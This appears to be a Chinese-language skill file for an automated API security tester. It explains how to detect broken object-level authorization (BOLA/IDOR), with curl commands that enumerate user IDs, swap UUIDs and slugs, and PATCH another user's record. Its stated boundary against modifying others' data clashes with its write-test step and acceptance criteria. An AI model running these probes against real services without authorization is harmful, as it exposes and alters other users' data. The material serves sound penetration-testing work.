---
name: bola
description: 检测 API 中的对象级授权缺陷（BOLA/IDOR），通过篡改对象标识符越权访问或修改其他用户的数据。
category: api
source: xalgorix
tags:
  - BOLA
  - API 安全
  - 授权缺陷
  - OWASP API1:2023
required_tools:
  - curl
---

# BOLA 对象级授权缺陷检测

## 适用场景

- 目标 REST API 的 URL 路径或参数中包含对象标识符（数字 ID、UUID）。
- 需要验证用户 A 是否能访问用户 B 的资源。
- 批量操作和多用户场景下的水平越权测试。

## 授权边界

- 仅读取自己的测试账号和他人的可公开数据，不修改其他用户数据。
- 批量枚举时控制请求速率。

## 前置条件

- 两个不同权限级别的测试账号。
- 已通过 inventory 收集 API 端点列表。

## 执行步骤

### 步骤 1：端点与 ID 映射

```bash
# 列出所有包含对象引用的端点
# GET /api/users/123
# GET /api/orders/456/items
# POST /api/documents/789/download
```

### 步骤 2：基线请求

```bash
# 用账号 A 获取自己的资源
curl -s "https://<target>/api/users/<user_a_id>/profile" \
  -H "Authorization: Bearer <token_a>" | tee baseline.json
```

### 步骤 3：水平越权探测

```bash
# 用账号 A 的 Token 访问其他用户 ID
for id in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://<target>/api/users/$id/profile" \
    -H "Authorization: Bearer <token_a>")
  [ "$code" = "200" ] && echo "BOLA possible: user $id"
done
```

### 步骤 4：ID 类型变异

```bash
# UUID 场景 — 用账号 B 的 UUID 替换
curl -s "https://<target>/api/users/<user_b_uuid>/profile" \
  -H "Authorization: Bearer <token_a>"

# Slug 场景
curl -s "https://<target>/api/users/<user_b_username>/profile" \
  -H "Authorization: Bearer <token_a>"
```

### 步骤 5：写操作 BOLA

```bash
# PATCH 修改其他用户数据
curl -X PATCH "https://<target>/api/users/<user_b_id>" \
  -H "Authorization: Bearer <token_a>" \
  -H "Content-Type: application/json" \
  -d '{"note": "BOLA test - please ignore"}'
```

## 停止条件

- 可修改其他用户数据时立即停止并记录。
- 批量枚举触发 429 时暂停。

## 输出格式

- 存在 BOLA 的端点和方法。
- 受影响对象 ID 类型和范围。
- 读写权限判断。

## 验收标准

1. 对所有含对象引用的端点进行了越权探测。
2. 覆盖了数字 ID、UUID 和字符串 Slug 三种类型。
3. 测试了 GET 和至少一种写操作（PUT/PATCH/DELETE）。
